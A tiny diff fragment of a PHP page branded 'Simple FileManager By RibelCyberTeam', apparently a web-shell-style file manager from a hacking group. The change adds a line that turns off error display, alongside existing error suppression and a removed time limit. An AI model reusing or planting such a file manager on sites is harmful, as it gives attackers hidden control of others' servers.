@@ -31,6 +31,7 @@
             <h1 class="mb-4 text-center">Simple FileManager By RibelCyberTeam</h1>
         </a>
         <?php
+	ini_set('display_errors', 0);
         error_reporting(0);
         @clearstatcache();
         set_time_limit(0);
